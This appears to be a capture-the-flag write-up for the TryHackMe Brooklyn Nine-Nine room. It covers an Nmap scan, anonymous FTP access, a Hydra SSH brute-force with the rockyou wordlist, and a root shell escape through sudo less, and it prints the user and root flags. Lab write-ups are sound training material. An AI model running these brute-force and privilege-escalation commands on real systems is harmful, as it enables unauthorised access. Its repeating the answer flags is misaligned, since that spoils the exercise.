# <div align="center">[Brooklyn-Nine CTF](https://tryhackme.com/r/room/brooklynninenine)</div>

<div align="center">
<img src="https://github.com/user-attachments/assets/f99597c1-133b-4e59-a5b7-5e673ec6c862" height="200"></img>
</div>

## Task 1. Deploy and get hacking.

### 1. User flag
```
ee11cbb19052e40b07aac0ca060c23ee
```
### 2. Root flag
```
63a9f0ea7bb98050796b649e85481845
```

# 1. Let start Scanning the IP with Nmap.
```
death@esther:~/Lab/Brooklyn-Nine-Nine$ nmap 10.10.112.152 -sV -sC -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 16:45 IST
Nmap scan report for 10.10.112.152
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.120.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds
```
## Here, We can see that there are 3 open ports:
### 1. FTP on port 21.
### 2. SSH on port 22.
### 3. HTTP on port 80.

# 2. We Get something Intreasting here "FTP".
### Let try to login with default Credentials ```anonymous```:```anonymous```
<div align="center">
<img src="https://github.com/user-attachments/assets/987901ef-e57f-4eca-aa0f-a033a5f505f2" height=""></img>
</div>

### login successfully.

<div align="center">
<img src="https://github.com/user-attachments/assets/2157b64d-a0c8-4f3c-a9c4-c8d1d03f71f3" height="400"></img>
</div>

### here we got a txt file. I just downloaded to my system using get command
## Here is the txt file,
<div>
<img src="https://github.com/user-attachments/assets/94a7a2b9-4d44-4417-9ebe-5efcda90ffc0" height=""></img>
</div>

### We got 2 username: Amy, Jake , holt and ```Jake``` is our username for ssh as we read note we understand that jake ssh password is weak.
# 3. Let Brute-force SSH using Hydra.
```
hydra -l jake -P /home/death/wordlists/rockyou.txt 10.10.112.152 ssh -t 50
```
<div>
<img src="https://github.com/user-attachments/assets/84d20c5b-0cfa-450d-a0d3-73cc5d77c362" height=""></img>
</div>

### login: ```jake```   password: ```987654321```
## Logged In as Jake successfully.
### I didn't find anything good in jake directory.

<div align="center">
<img src="https://github.com/user-attachments/assets/7fe2359b-1090-4afb-99e8-e72ce5c8a6c3" height=""></img>
</div>

## Let check for /home,

<div align="center">
<img src="https://github.com/user-attachments/assets/352aee94-8ae1-424b-af60-e6522a9d08db" height=""></img>
</div>

### Here are 3 user, Let check hold directory.

<div align="center">
<img src="https://github.com/user-attachments/assets/a2482abb-5dcc-45f7-b988-cbcf1c951bbc" height=""></img>
</div>

## Here is the User-Flag.txt
```
ee11cbb19052e40b07aac0ca060c23ee
```
# 4. Let escalate our privileges
## Let's see if we can run any commands of root.
```
sudo -l
```

<div align="center">
<img src="https://github.com/user-attachments/assets/5b1e2262-b361-4360-8198-b070fbc67fb1" height=""></img>
</div>

## Ok we can run less command as root,Let visit gtfobin
### search for less.

<div align="center">
<img src="https://github.com/user-attachments/assets/6acaf07a-a153-47b0-b964-c43ab13726a1" height="400"></img>
</div>


### Here is for sudo:

<div align="center">
<img src="https://github.com/user-attachments/assets/e8fcbf20-d206-42b6-9e49-6c4ac7b77d35" height="400"></img>
</div>

```
sudo less /etc/profile
!/bin/sh
```
## Let Run in terminal

<div align="center">
<img src="https://github.com/user-attachments/assets/ecb057f8-16b9-4381-8648-fa88ffc973b3" height="400"></img>
</div>

## Press Enter on keyboard

<div align="center">
<img src="https://github.com/user-attachments/assets/c12d0bc6-3f5a-4b36-ae4b-1d33f93fd8c9" height=""></img>
</div>

## We got root
### Let find root flag at /root

<div align="center">
<img src="https://github.com/user-attachments/assets/50ed14b8-5273-4378-8ebe-944f526db71e" height=""></img>
</div>

```
63a9f0ea7bb98050796b649e85481845
```

# Thank you 😸
